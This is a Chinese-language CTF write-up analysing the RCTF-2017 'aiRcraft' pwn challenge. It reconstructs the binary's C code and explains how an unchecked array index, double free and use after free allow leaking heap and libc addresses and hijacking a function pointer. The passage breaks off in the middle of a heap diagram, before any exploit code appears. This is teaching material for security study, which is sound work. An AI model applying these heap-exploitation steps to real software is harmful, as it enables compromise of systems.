> 原文链接: https://www.anquanke.com//post/id/157802 


# aiRcraft题目详析——Double free与UAF


                                阅读量   
                                **152160**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01744ac2b04d8f434e.jpg)](https://p2.ssl.qhimg.com/t01744ac2b04d8f434e.jpg)

## Introduction

aiRcraft是RCTF-2017（CTFTIME评分24.13）中的一道pwn题， 分值为606。

这道题主要涉及的知识点有：

1. Double Free

2. Use After Free

虽然知识点并不复杂，利用方法也中规中矩，但是题目对于菜单的某些设置使我们在利用时会遇到一些困难——不同于普通菜单题所提供的操作，本题所提供的操作耦合度较高（相对于heap的原子操作，如malloc，free），所以我们进行exploit时的每一个操作都必须充分考虑到它所带来的边际效应，并恰当地进行拼凑，达到get shell的目的。因此这道题对我们的调试提出了较高的要求。

这篇writeup的目的在于以一个初学者的视角（我本人确实也是初学者），对这道题进行一个详尽的分析，并尝试从这道题中总结某种做题的模式，顺便总结在exploit过程中可能遇到的坑，为之后的工作带来一些启发。深谙ctf的老手可以选择感兴趣的部分阅读，欢迎批评指正。



## Reverse &amp; Static Analysis

这道题目提供了一个Binary以及libc，它们的二进制文件可以在我的github中找到：

Binary:[https://github.com/kongjiadongyuan/pwn-study/blob/master/2017-Rctf/aiRcraft/aiRcraft](https://github.com/kongjiadongyuan/pwn-study/blob/master/2017-Rctf/aiRcraft/aiRcraft)

libc:[https://github.com/kongjiadongyuan/pwn-study/blob/master/2017-Rctf/aiRcraft/libc.so.6](https://github.com/kongjiadongyuan/pwn-study/blob/master/2017-Rctf/aiRcraft/libc.so.6)

### 1. 首先我们对题目简单的运行，对它有一个基本的了解：

```
(pwn) kongjiadongyuan in ~/aiRcraft λ checksec aiRcraft
[*] '/home/kongjiadongyuan/aiRcraft/aiRcraft'
Arch: amd64-64-little
RELRO: Full RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
```

从这里我们可以得到以下信息：

1. 64位程序；

2. got表无法修改（这比较重要，因为修改got表是我们的一个重要手段）；

3. Stack Canary防止栈溢出，虽然这不是这一题的重点；

4. NX，意味着我们无法进行shellcode的运行；

5. PIE意味着这一题的代码段位置随机化了，我们无法将执行流劫持到某一特定的代码段位置了，除非我们泄露了地址。

现在我们尝试运行一下程序：

```
(pwn) kongjiadongyuan in ~/aiRcraft λ ./aiRcraft
Welcome to aiRline!
what do you want to do?
1. Buy a new plane
2. Build a new airport
3. Enter a airport
4. Select a plane
5. Exit
Your choice:
```

在进行了进一步的测试之后，我们就会大致理清楚这道题的逻辑：（这里只是粗略地了解，之后在代码分析中再细致地分析）

这道题存在两种逻辑上的实体：airport，plane；plane具有**Company**，**Name**的属性，并且可以飞往各个airport，airport有**Name**的属性，并且可以承载各个plane。

这里应该特别指出，这道题具有时间限制，当预设的时间到达时，程序会自动退出：

```
[1] 27244 alarm ./aiRcraft
```

这也是一种菜单题中比较常见的做法，目的是为了防止在选手做题时保持长时间的连接虚耗资源（如果需要出题可以效仿这种做法）

在使用gdb调试时，接收到alarm的信号时只会提醒，不会退出程序，因此在进行实际调试时，只需要gdb attach到相应的进程号就可以避免接收到信号退出。

### 2. 现在我们开始对题目进行逆向

配合ida的反编译功能，并对一些变量进行重新命名，同时将一些结构体进行自定义，我手动写出了题目的源码（不是原始代码），相对来说可读性比较高了，在这里进行展示，以供大家参考。

```
//先展示两个结构体
struct airport`{`
	char* airport_name;
	plane* planes[16];
`}`;
struct plane`{`
	char plane_name[32];
	char* company_name;
	struct airport* airport;

	struct plane* ubk;
	struct plane* ufd;
	/*
		这两个指针是为了维护plane的双链表管理结构的指针。
		为了避免发生混淆，这里需要特别指出，这里的ubk，ufd并不是libc中chunk结构的fd与bk，而是由这个程序自己维护的双链表指针。
	*/

	void* free_pointer;
	/*
		这里的指针指向了一个函数的入口，这个入口后来被证实是一个包装过的free()函数，在程序中，如果释放plane结构体，会选择调用这个指针所指向的函数，而不是libc的free()函数（虽然实际上就是调用free()函数）。
		这显然是一种面向对象的思想，虽然在c程序中这样写显得很愚蠢而且很刻意——改写这个指针就是我们exploit的最后一步，但是在实际场景中，面向对象的思想确实会写出这种代码，因此还是有一定的指导意义的。
	*/
`}`;
/*
	为了方便之后的分析，在这里放上结构体中各个成员的偏移量：
struct airport:
00000000 airport         struc ; (sizeof=0x88, align=0x8, mappedto_13)
00000000 airport_name    dq ?                    ; offset
00000008 planes          dq 16 dup(?)            ; offset
00000088 airport         ends

struct plane:
00000000 plane           struc ; (sizeof=0x48, align=0x8, mappedto_10)
00000000                                         ; XREF: .bss:plane_header/r
00000000 plane_name      db 32 dup(?)
00000020 company_name    dq ?                    ; offset
00000028 airport         dq ?
00000030 ubk              dq ?                    ; offset
00000038 ufd              dq ?                    ; XREF: select_plane+52/r ; offset
00000040 free_pointer    dq ?                    ; offset
00000048 plane           ends
！！！！！！这里需要注意，plane结构实际上只使用了结构体的前0x40个字节的位置，但是在申请时申请了0x48的空间。
*/

//再强调几个全局变量，这几个全局变量在整道题目中有重要意义
/*
airports，用来管理所有airport的一个指针数组：
.bss:0000000000202080 ; airport *airports[16]
.bss:0000000000202080 airports        dq 10h dup(?)
*/
airport *airports[16];

/*
plane_header，是管理所有plane的结构，本质上是plane链表的链表头
.bss:0000000000202100 ; plane plane_header
.bss:0000000000202100 plane_header    plane &lt;?&gt;
在初始化后与plane具有相同大小，同样是0x48
*/
plane plane_header;//在usr_init函数中会初始化为0

/*
companies, 这是一个指针数组，每个元素都指向一个公司名字字符串，我们的exploit核心之一就在这里，后面会详细介绍。
.data:0000000000202020 ; char *companies[]
.data:0000000000202020 companies       dq offset aBoeing       ; DATA XREF: buy_plane+2A↑o
.data:0000000000202020                                         ; buy_plane+B4↑o
.data:0000000000202020                                         ; "Boeing"
.data:0000000000202028                 dq offset aAirbus       ; "AirBus"
.data:0000000000202030                 dq offset aLockheed     ; "Lockheed"
.data:0000000000202038                 dq offset aBombardier   ; "Bombardier"
.data:0000000000202038 _data           ends
*/
char *companies[4];
char aBoeing[7] = "Boeing\0"
char aAirbus[7] = "AirBus\0";
char aLockheed[9] = "Lockheed\0";
char aBombardier[11] = "Bombardier\0";
companies[0] = aBoeing;
companies[1] = aAirbus;
companies[2] = aLockheed;
companies[3] = aBombardier;

//main函数，offset=0x0000000000001530
int main()`{`
	usr_init();
	operate();
`}`

//usr_init函数，offset=0x000000000000147C
airport* usr_init()`{`
	struct airport* result;
	signed int i;

	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	setvbuf(stderr, 0, 2, 0);
	alarm(0x3C);
	result = memset(&amp;plane_header, 0, 0x48);
//将plane_header的0x48个字节全部初始化为0，链表头不指向任何下一个节点，即现在并没有任何一架飞机
	for(i = 0; i &lt;= 15; ++i)`{`
		result = airports;
		airports[i] = 0;
	`}`
//将airports数组中的所有指针全部置空，即现在并没有任何一座机场
	return result;
`}`

//operate函数，offset=0x000000000000138C
//这是这道题目的主体函数
void operate()
`{`
  int savedreg;
  puts("Welcome to aiRline!");
  while ( 1 )
  `{`
    puts("what do you want to do?");
    puts("1. Buy a new plane");
    puts("2. Build a new airport");
    puts("3. Enter a airport");
    puts("4. Select a plane");
    puts("5. Exit");
    printf("Your choice: ");
    input_choice();
    switch ( savedreg )
    `{`
      case 1u:
        buy_plane();
        break;
      case 2u:
        build_airport();
        break;
      case 3u:
        enter_airport();
        break;
      case 4u:
        select_plane();
        break;
      case 5u:
        exit(0);
        return;
      default:
        puts("Invaild choice!");
        break;
    `}`
  `}`
`}`
/*
这里的调理比较清晰，我们可以清楚地知道四 个一级菜单的主要操作函数为：
	buy_plane()
	build_airport()
	enter_airport()
	select_plane()
在介绍这四个主要函数之前，我们还需要先剖析一下一个比较小的函数：
	input_choice()
*/

//input_choice函数，offset=0x0000000000000B20
int input_choice()`{`
	int v1;
	int result;
	char nptr;
	unsigned int v3;

	v3 = __readfsqword(0x28u)
	input2addr(&amp;nptr, 32);
	v1 = atoi(&amp;nptr);
	if(v1 &gt;= 0)
		result = (unsigned int)v1;
	else
		result = 0xFFFFFFFFLL;
	return result;
`}`
/*
	这个函数的逻辑相对来说也比较清晰，其中嵌套的函数input2addr()稍后再分析，现在我们来理清这个函数的某些特点：
	1.我们注意到虽然input_choice()函数确实会返回一个值，但是在operate()函数中并没有对返回值进行接收，返回值凭空出现在了savedreg变量中，实际上在这里（这道题目中只有operate()中的这个地方是这样）变量的值是由寄存器传递的，因此在反编译中并不能体现出来。这一点只需要好好看一看汇编代码就可以明白。
	2.这个函数只接受正值输入，如果输入负值就会返回-1，这个特性在之后会用到。
*/

//input2addr函数，offset=0x0000000000000AA0
int input2addr(char *maddr, int length)`{`
	char buf;
	usigned int i;
	
	for( i = 0; i &lt; length &amp;&amp; read(0, &amp;buf, 1) &gt; 0; ++i )`{`
		maddr[i] = buf;
		if( maddr[i] = '\n' )`{`
			maddr[i] = 0;
			return i;
		`}`
	`}`
	return i;
`}`
/*
	像这样的输入函数一直是我们乐于分析的对象，因为这种函数一不小心就会存在越界情况，无论是严重的overflow，还是单字节的off-by-one都能对我们解题带来难以想象的帮助；并且对于录入方法的分析，可以让我们了解哪些字符会截断我们的输入，这对我们之后地址和shellcode的选择有重要的指导。
	1.这个函数采用read方法进行录入，则不会被截断，交给程序进行手动截断；
	2.当程序进行录入时会严格检查边界，当录入长度到达length时，就会强行截断，同时在检测到输入'\n'时也会截断，并将'\n'改为'\0'作为字符串的结尾。这里需要注意，当输入超过了length时，并不会将最后一个字符改为'\0'，因此在这里是有可能触发非法读的（非法写是不会出现的），在后面的函数中给我们会看到，每当调用了这个函数，之后调用者会手动将 maddr[length-1] 更改为'\0'，因此在这个上下文中，这个函数是比较安全的。
*/

//接下来分析四个一级菜单函数
//buy_plane函数，offset=0x0000000000000BED
plane* buy_plane()`{`
	struct plane *result;
	int tmp;
	int choice;
	struct plane *plane;
	
	puts("which company? ");//其实这句话的单词被出题人拼错了:p
	tmp = 0;
	while(tmp &lt;= 3)`{`
		printf("%d.%s\n", tmp+1, companies[tmp], tmp);
		tmp = tmp + 1;
	`}`
	printf("Your choice: ");
	choice = input_choice();
	plane = (struct plane *)malloc(0x48);
	if( !plane )`{`
		puts("malloc error!");
		exit(1);
	`}`
	plane-&gt;company_name = companies[choice - 1];
	//这个题目的关键漏洞之一，这里并没有进行越界检查
	printf("Input the plane's name: ");
	input2addr(plane-&gt;plane_name, 0x20);
	/*
		这里为了避免读者在看源码时存在疑问，需要解释一下，根据ida的反编译结果，这个语句本来应该是这样：
		input2addr(plane, 0x20);
		但是根据之前的input2addr()函数的分析，可以知道这个函数只关心第一个参数所指向的地址，而在plane结构体中plane_name[0x20]数组的偏移量为0x00，因此这里传入plane参数或是plane_name参数本质上是没有任何区别的，这里我为了增加逻辑上的可读性，将第一个参数改为了plane-&gt;plane_name,对结果没有任何影响。特此说明。
	*/
	plane-&gt;plane_name[0x1F] = 0;
	/*
		这里就是之前所提到的，在调用了input2addr()函数之后，调用者将最后一个字节手动改为了'\0'，保证了程序的鲁棒性。
		虽然这样做保证了安全，但是却给了我们启发——我们不可能永远都记得这个函数调用之后需要手动将最后一个字节清零，因此在稍大一点的工程中这里是一定会出现漏洞的，因此我们在编程时应该注意在函数中做好维护工作，保证函数的功能在逻辑上的严密性以及完整性。
	*/
	plane-&gt;airport = 0;
	add_plane_to_linklist(plane);
	result = plane;
	plane-&gt;free_pointer = wrapped_free;
	return result;
`}`
/*
	这里出现了本题中第一个关键漏洞，在 plane-&gt;company_name = companies[choice -1] 这一条语句中并没有考虑到choice超过4的情况（从逻辑上说，companies数组只存在4个元素，因此 choice &gt;= 4 的情形应该一律算作越界），所以我们可以在这里将plane-&gt;company_name数组尽情地赋值为我们想要的地址。
	choice是之前调用input_choice()函数的返回值，而在之前的分析我们已经知道，这个函数只会返回正的值，负的值一律变为-1，因此从大方向来说，我们只能将plane-&gt;company_name赋值为比companies数组更高的地址（offset &gt;= 0x0000000000202020）。
	我们的第一反应是如果能够将它指向got表，也许就可以泄露libc的地址，但是很可惜，我们的got表位于更低的地址，因此无法这么做。让我们将眼光向广袤的高地址区域探索，我们发现了一个引起我们兴趣的地方——plane_header,offset = 0x0000000000202100，而plane_header-&gt;ufd的地址为offset(plane_header)+0x30+0x10（这里需要解释一下，0x30是ufd成员在plane_header结构体的偏移量，而0x10是堆管理结构中的prev_size以及size域的空间），换算成与companies数组的索引为 (offset(plane_header) + 0x30 + 0x10 - offset(companies))/0x8 = 36，即companies[36]的值就是一个指向某plane结构体的指针！（注意这里的指针并不是指向chunk的头部，而是指向chunk头部地址加0x10，因为在malloc时返回的是可用空间的地址） 
	在这里，我们不妨将正在创建的plane结构体的名字叫做op_plane，一旦我们将plane_header-&gt;ufd的值赋值给了这里的op_plane-&gt;company_name,并且在赋值之前plane_header-&gt;ufd已经指向了一个plane结构体（我们不妨把它叫做old_plane），那么此时的op_plane-&gt;company_name就正好指向old_plane-&gt;plane_name。下面是一个简单的示意图：
                                                                                   
                             plane_header                                          
                      +-----------------------+                                    
                      |       prevsize        |                                    
                      +-----------------------+                                    
                      |         size          |                                    
                      +-----------------------+                   old_plane        
                      |                       |           +-----------------------+
                      |        ......         |           |       prevsize        |
                      |                       |           +-----------------------+
equivalent to         +-----------------------+           |         size          |
companies[36] ---+---&gt;|          ufd          |-----+----&gt;+-----------------------+
                 |    +-----------------------+     |     |                       |
                 |    |          ubk          |     |     |                       |
                 |    +-----------------------+     |     |      plane_name       |
                 |    |        ......         |     |     |                       |
                 |    |                       |     |     |                       |
                 |    +-----------------------+     |     +-----------------------+
                 |                                  |     |        airport        |
 op_plane-&gt;company_name=companies[36]               |     +-----------------------+
                 |                                  |     |          ufd          |
                 |            op_plane              |     +-----------------------+
                 |    +-----------------------+     |     |          ubk          |
                 |    |       prevsize        |     |     +-----------------------+
                 |    +-----------------------+     |     |        ......         |
                 |    |         size          |     |     +-----------------------+
                 |    +-----------------------+     |                              
                 |    |        ......         |     |                              
                 |    +-----------------------+     |                              
                 +---&gt;|     company_name      |-----+                              
                      +-----------------------+                                    
                      |                       |                                    
                      |                       |                                    
                      |        ......         |                                    
                      |                       |                                    
                      |                       |                                    
                      +-----------------------+                                    

	更加有意思的事情在于old_plane结构体中plane_name所在的位置：
                      +-----------------------+              
                      |       prevsize        |              
                      +-----------------------+              
                      |         size          |              
 plane_header-&gt;ufd---&gt;+-----------------------+------------  
                      |          fd           |     |        
                      +-----------------------+     |        
                      |          bk           |     |        
                      +-----------------------+  plane_name  
                      |                       |     |        
                      |                       |     |        
                      |                       |     |        
                      |                       |     v        
                      +-----------------------+------------  
                      |                       |              
                      |                       |              
                      |                       |              
                      |        ......         |              
                      |                       |              
                      |                       |              
                      |                       |              
                      |                       |              
                      +-----------------------+              
	图中的fd与bk指的是libc的堆管理结构中的指针：
		1.如果这个位置存在一个free状态的，大小处于fast bin范围的chunk，且fastbin中存在其他的chunk，fd的位置就会是一个指向堆中某个chunk的指针；
		2.如果这个位置存在一个free状态的，大小处于unsorted bin范围的chunk，fd与bk的位置都就都会是指向main_arena结构体的指针。

	在之后的函数中，我们会看到：我们选择打印plane结构体，实际上是打印plane-&gt;company_name所指向的字符串，因此一旦我们之前所说的条件达成，堆中的某个地址或者libc中的某个地址就会以字符串的形式被打印出来。我们就可以以此泄露想要的地址，绕过PIE以及ASLR的限制。
	
	除此之外，我们还有另外一种思路：
	在偏移量为0x0000000000202080处，有airports数组，对应companies中的索引为 (offset(airports) - offset(companies))/0x8 = 13, 如果我们将正在申请的plane（不妨称为op_plane）的元素op_plane-&gt;company赋值为airports所在的位置，而刚好airports数组的第一个元素正储存着一个airport的指针(不妨称为old_airport)，那么我们就可以直接访问old_airport的元素了：
                                                                                       
                                 airports                                              
 equivalent to           +-----------------------+                                     
 companies[13]-----+----&gt;|      airports[0]      |-----+                               
                   |     +-----------------------+     |                               
                   |     |      airports[1]      |     |                               
                   |     +-----------------------+     |                               
                   |     |      airports[2]      |     |                               
                   |     +-----------------------+     |                               
                   |     |                       |     |                               
                   |     |                       |     |            old_airport        
                   |     |                       |     |      +-----------------------+
                   |     |        ......         |     |      |       prevsize        |
                   |     |                       |     |      +-----------------------+
                   |     |                       |     |      |         size          |
                   |     |                       |     +-----&gt;+-----------------------+
                   |     +-----------------------+     |      |     airport_name      |
                   |                                   |      +-----------------------+
 op_plane-&gt;company_name=companies[13]                  |      |                       |
                   |                                   |      |                       |
                   |             op_plane              |      |        ......         |
                   |     +-----------------------+     |      |                       |
                   |     |       prevsize        |     |      |                       |
                   |     +-----------------------+     |      |                       |
                   |     |         size          |     |      |                       |
                   |     +-----------------------+     |      +-----------------------+
                   |     |        ......         |     |                               
                   |     +-----------------------+     |                               
                   +----&gt;|     company_name      |-----+                               
                         +-----------------------+                                     
                         |                       |                                     
                         |                       |                                     
                         |        ......         |                                     
                         |                       |                                     
                         |                       |                                     
                         +-----------------------+                                     
	old_airport-&gt;airport_name正是一个指向某个chunk的指针，这个chunk是在进行airport_build操作时为了存储airport_name字符串而申请，同样在堆上，因此这里可以泄露出堆的地址；
	同样地old_airport-&gt;airport_name所对应的偏移量在chunk处于free状态时也是libc管理结构中的fd指针，指向main_arena，因此可以泄露出libc的基地址。

*/

/*
	接下来展示两个在buy_plane函数中调用的小函数:
	1.add_plane_to_linklist()
	2.wrapped_free()
*/
//add_plane_to_linklist函数,offset=0x0000000000000B98
plane* add_plane_to_linklist(struct plane *plane)`{`
	struct plane *result;
	struct plane *i;
	
	for( i = &amp;plane_header; i-&gt;ufd; i = i-&gt;ufd);
	
	i-&gt;ufd = plane;
	plane-&gt;ufd = 0;
	result = plane;
	plane-&gt;ubk = i;
	return result;
`}`
//wrapped_free函数,offset=0x0000000000000B7D
void wrapped_free(struct plane *plane)`{`
	free(plane);
`}`

//build_airport函数，offset=0x0000000000000E08
int build_airport()`{`
	struct airport **tmp;
	int i;
	int j;
	int name_length;

	for( i = 0; i &lt;= 15 &amp;&amp; airports[i]; ++i);
	if(i &lt;= 15)`{`
		printf("how long is the airport's name? ");
		name_length = input_choice();
		if( name_length &gt; 0xF &amp;&amp; name_length &lt;= 0x100)`{`
			airport = (struct airport *)malloc(0x88);
			if( !airport )`{`	
				puts("malloc error!");
				exit(1);
			`}`
			for( j = 0; j &lt;= 15; ++j )
				airport-&gt;planes[j] = 0;
			airport-&gt;airport_name = malloc(name_length);
			memset(airport-&gt;airport_name, 0, name_length);
			printf("Please input the name: ", 0);
			input2addr(airport-&gt;airport_name, name_length);
			tmp = airports;
			airports[i] = airport;
		`}`
		else`{`
			v0 = puts("Invalid length!");
		`}`
	`}`
	else`{`
		v0 = puts("Too much airport!");
	`}`
	return (signed int)v0;
`}`
/*
	这个函数的返回值比较奇怪但是无关紧要——反正也没有函数去接收它的返回值。
	注意这里airport_name所指向的空间是依据我们填写的尺寸进行申请的空间，其空间的范围为 name_length &gt; 0xF &amp;&amp; name_length &lt;= 0x100， 即0x10~0x100，这个范围处于small bins中，并且已经超过了fast bins的范围，因此我们可以申请一个超过0x80大小（这里指chunk大小，申请则应该超过0x78,即最少0x79大小）的chunk，释放之后就会被放入unsorted bins，此时chunk中的fd与bk（不是ufd,ubk，而是libc的管理结构）都指向main_arena。
	但是需要注意的是，由于最大的申请大小为0x100，因此无法触发fastbin_consolidate。
*/

//enter_airport函数，offset = 0x000000000000130C
int enter_airport()
`{`
  int result;
  signed int v1;

  printf("Which airport do you want to choose? ");
  v1 = input_choice();
  if ( v1 &gt;= 0 &amp;&amp; v1 &lt;= 15 &amp;&amp; airports[v1] )
    result = operate_airport(airports[v1]);
  else
    result = puts("No such airport!");
  return result;
`}`
//这里依据airports数组中的索引选择一个airport，进行下一步操作

//operate_airport函数,offset = 0x00000000000011A5
int operate_airport(struct airport *airport)
`{`
  int result;

  while ( 1 )
  `{`
    puts("What do you want to do ?");
    puts("1. List all the plane");
    puts("2. Sell the airport");
    puts("3. Exit");
    printf("Your choice: ");
    result = input_choice();
    if ( result == 2 )
      break;
    if ( result == 3 )
      return result;
    if ( result == 1 )
      list_plane(airport);
    else
      puts("Invaild choice!");
  `}`
  return sell_airport(airport);
`}`
/*这个函数就是airport操作的二级菜单*/

//list_plane函数,offset = 0x0000000000000D08
struct plane *list_plane(struct airport *airport)
`{`
  struct plane *tmp1;
  int i;
  struct plane *tmp2;

  for ( i = 0; i &lt;= 15; ++i )
  `{`
    tmp1 = airport-&gt;planes[i];
    tmp2 = airport-&gt;planes[i];
    if ( tmp2 )
    `{`
      printf("Plane name: %s\n", tmp2);
      printf("Build by %s\n", tmp2-&gt;company_name);
      tmp1 = printf("Docked at: %s\n", *tmp2-&gt;airport);
    `}`
  `}`
  return tmp1;
`}`
/*
	这就是配合之前所提到的漏洞泄露地址的关键函数
*/

//sell_airport函数,offset = 0x0000000000000F5E
int sell_airport(struct airport *airport)
`{`
  struct plane *ptr;
  int i;

  for ( i = 0; i &lt;= 15; ++i )
  `{`
    if ( airport-&gt;planes[i] )
    `{`
      ptr = airport-&gt;planes[i];
      unlink_plane(airport-&gt;planes[i]);
      free(ptr);
      airport-&gt;planes[i] = 0LL;
    `}`
  `}`
  free(airport);
  return puts("Success!");
`}`
/*
	这个函数将airport中所有的plane全部从链表中取出，并进行释放，同时将airport-&gt;planes数组的对应位置置零，最后将自身释放。
	这个函数主要有这样几个问题：
		1.在释放自身之前，并没有释放airport_name所指向的空间，因此airport-&gt;name所指向的空间永远没有机会释放了；
		2.从逻辑上来讲，一个plane如果已经被释放过，应该在airport-&gt;planes数组中同时清零，而在之后提到的sell_plane函数中并没有这么做，因此在plane所在的chunk被释放之后，还可以通过sell_airport函数再次进行free操作，达到double free的效果；
		3.在释放自身之后，并没有从airports数组中把相对应的元素清零，这意味着一旦释放之后，这个airport的指针将一直存在。
*/

//select_plane函数，offset = 0x0000000000001242
unsigned __int64 select_plane()
`{`
  int name_length;
  struct plane *plane;
  char name;
  unsigned __int64 v4;

  v4 = __readfsqword(0x28u);
  memset(&amp;name, 0, 0x20uLL);
  printf("Which plane do you want to choose? ", 0LL);
  name_length = input2addr(&amp;name, 32);
  for ( plane = plane_header.ufd; plane &amp;&amp; strncmp(plane-&gt;plane_name, &amp;name, name_length); plane = plane-&gt;ufd );
  if ( plane )
    operate_plane(plane);
  else
    puts("No such plane!");
  return __readfsqword(0x28u) ^ v4;
`}`
/*
	通过plane-&gt;plane_name字符串在链表中选择一个plane，并进入二级菜单
*/

//operate_plane函数，offset = 0x0000000000001108
int operate_plane(struct plane *plane)
`{`
  int choice;
  int result;

  while ( 1 )
  `{`
    puts("What do you want to do ?");
    puts("1. Fly to another airport");
    puts("2. Sell the plane");
    puts("3. Exit");
    printf("Your choice: ");
    choice = input_choice();
    result = choice;
    if ( choice == 2 )
      break;
    if ( result == 3 )
      return result;
    if ( result == 1 )
      fly_to(plane);
    else
      puts("Invaild choice!");
  `}`
  return sell_plane(plane);
`}`
/*
	这是对plane操作的二级菜单
*/

//fly_to函数，offset = 0x0000000000000FEA
int fly_to(struct plane *plane)
`{`
  int tmp;
  int i;
  struct airport *airport;

  printf("which airport do you want to fly? ");
  tmp = input_choice();
  if ( tmp &gt;= 0 &amp;&amp; tmp &lt;= 15 )
  `{`
    if ( airports[tmp] )
    `{`
      plane-&gt;airport = airports[tmp];
      airport = airports[tmp];
      for ( i = 0; i &lt;= 15 &amp;&amp; airport-&gt;planes[i]; ++i )
        ;
      if ( i &lt;= 15 )
      `{`
        airport-&gt;planes[i] = plane;
        tmp = printf("%s to %s!\n", plane, *plane-&gt;airport);
      `}`
      else
      `{`
        tmp = puts("Too much plane!");
      `}`
    `}`
    else
    `{`
      tmp = puts("No such airport!");
    `}`
  `}`
  return tmp;
`}`
/*
	将plane-&gt;airport指向飞往的airport，在飞往的airport的数组中加入这个plane的指针。
	这个函数的特点如下：
		并没有将之前所在的airport-&gt;planes数组中将自身指针清除，所以理论上来说，可以同时存在于多个airport-&gt;planes数组中，可以达到无数次的free操作（虽然在这里没有用到，但是应该可以有其他思路）。
*/

//sell_plane函数，offset = 0x0000000000000DD7 int sell_plane(struct plane *plane)`{`
	unlink_plane(plane);
	return (plane-&gt;free_pointer)(plane);
`}`
/*
	先将plane从链表中取下，再调用函数将chunk释放。
	这里就是我们exploit策略的最后一步，将plane-&gt;free_pointer改写之后，就可以劫持执行流了。
*/

//unlink_plane函数，offset = 0x0000000000000D97
struct plane *unlink_plane(struct plane *plane)
`{`
  struct plane *result;

  plane-&gt;ubk-&gt;ufd = plane-&gt;ufd;
  result = plane-&gt;ufd;
  if ( result )
  `{`
    result = plane-&gt;ufd;
    result-&gt;ubk = plane-&gt;ubk;
  `}`
  return result;
`}`
/*
	这里的操作与libc中的unlink（较早版本的，因为这里并没有进行检查）类似，理论上来说可以达到同样的unlink效果，只是这里有更加简单的方式可以getshell，这里可以通过精心布置ufd与ubk参数，达到一次任意内存写的操作。
*/
```



## EXPLOIT!

在前面的分析中，已经将各个函数的操作以及相关特性进行了详尽的分析，接下来我们开始制定我们的exploit策略。我们接下来提到的策略只是我本人的思路，由于这道题的开放度比较高，漏洞点相对也比较多（在前面的注释中也一一提到了），因此是一定会存在其他的思路的。

### 1. Leak Heap &amp; Libc

想要泄露堆和libc的地址，首先我们需要像之前所提到的一样，使某个plane的company_name变量指向某个airport的头部：

我们先进行build_airport操作，获得一个airport结构体，不妨称他为airport1，此时airports[0]也已经初始化，并指向airport1-&gt;airport_name：

```
heapbase  ------&gt;+-----------------------+     
 airport1         |       prevsize        |     
                  +-----------------------+     
                  |         size          |     
                  +-----------------------+     
                  |     airport_name      |----+
                  +-----------------------+    |
                  |                       |    |
                  |        ......         |    |
                  |                       |    |
 airport1's------&gt;+-----------------------+    |
 name string      |       prevsize        |    |
                  +-----------------------+    |
                  |         size          |    |
                  +-----------------------+&lt;---+
                  |                       |     
                  |         name          |     
                  |                       |     
                  |                       |     
                  +-----------------------+
```

此时，我们申请一个plane，不妨称它为plane1，并对它进行恰当赋值，使 plane1-&gt;company_name = companies[13] ，此时 plane1-&gt;company_name 与 &amp;(airport1-&gt;airport_name) 在数值上相等，但是并没有依赖关系，即使之后有其他的改变，plane1-&gt;company_name也会一直指向当前时刻airport1-&gt;airport_name所在的地址：

```
heapbase  ------&gt;+-----------------------+                equivalent to            
 airport1         |       prevsize        |                companies[13]--------+   
                  +-----------------------+                                     |   
                  |         size          |          +-----------------------+  |   
                  +-----------------------+&lt;---------|      airports[0]      |&lt;-+   
                  |     airport_name      |----+     +-----------------------+  |   
                  +-----------------------+    |     |      airports[1]      |  |   
                  |                       |    |     +-----------------------+  |   
                  |        ......         |    |     |      airports[2]      |  |   
                  |                       |    |     +-----------------------+  |   
 airport1's------&gt;+-----------------------+    |     |                       |  |   
 name string      |       prevsize        |    |     |                       |  |   
                  +-----------------------+    |     |                       |  |   
                  |         size          |    |     |        ......         |  |   
                  +-----------------------+&lt;---+     |                       |  |   
                  |                       |          |                       |  |   
                  |         name          |          |                       |  |   
                  |                       |          |                       |  |   
                  |                       |          +-----------------------+  |   
    plane1 ------&gt;+-----------------------+                                     |   
                  |       prevsize        |                                     |   
                  +-----------------------+                                     |   
                  |         size          |                                     |   
                  +-----------------------+                                     |   
                  |                       |                                     |   
                  |        ......         |                                     |   
                  |                       |                                     |   
                  |                       |                                     |   
                  +-----------------------+   plane1-&gt;company_name=companies[13]|   
                  |     company_name      |&lt;------------------------------------+   
                  +-----------------------+                                         
                  |                       |                                         
                  |        ......         |                                         
                  |                       |                                         
                  |                       |                                         
                  +-----------------------+
```

进行过这次操作之后，堆中的结构如下：

```
heapbase  ------&gt;+-----------------------+          
 airport1         |       prevsize        |          
                  +-----------------------+          
                  |         size          |          
                  +-----------------------+&lt;--------+
                  |     airport_name      |----+    |
                  +-----------------------+    |    |
                  |                       |    |    |
                  |        ......         |    |    |
                  |                       |    |    |
 airport1's------&gt;+-----------------------+    |    |
 name string      |       prevsize        |    |    |
                  +-----------------------+    |    |
                  |         size          |    |    |
                  +-----------------------+&lt;---+    |
                  |                       |         |
                  |         name          |         |
                  |                       |         |
                  |                       |         |
    plane1 ------&gt;+-----------------------+         |
                  |       prevsize        |         |
                  +-----------------------+         |
                  |         size          |         |
                  +-----------------------+         |
                  |                       |         |
                  |        ......         |         |
                  |                       |         |
                  |                       |         |
                  +-----------------------+         |
                  |     company_name      |---------+
                  +-----------------------+          
                  |                       |          
                  |        ......         |          
                  |                       |          
                  |                       |          
                  +-----------------------+
```

接下来我们只需要重新build_airport，不妨称它为airport2，并将plane1进行fly_to操作，放入airport2的数组中，并对airport2进行list操作，就可以顺利打印出plane1-&gt;company_name所指向的地址，即airport1-&gt;airport_name的值，此时，这个值为airport1’s name string的地址，这个地址虽然因为堆地址随机化而不固定，但是与heap基址的差值是恒定的，因此我们可以就此得到heap的基址。

进行了这一步操作之后，堆的结构如下：

```
heapbase  ------&gt;+-----------------------+          
 airport1         |       prevsize        |          
                  +-----------------------+          
                  |         size          |          
                  +-----------------------+&lt;--------+
                  |     airport_name      |----+    |
                  +-----------------------+    |    |
                  |                       |    |    |
                  |        ......         |    |    |
                  |                       |    |    |
 airport1's------&gt;+-----------------------+    |    |
 name string      |       prevsize        |    |    |
                  +-----------------------+    |    |
                  |         size          |    |    |
                  +-----------------------+&lt;---+    |
                  |                       |         |
                  |         name          |         |
                  |                       |         |
                  |                       |         |
    plane1 ------&gt;+-----------------------+         |
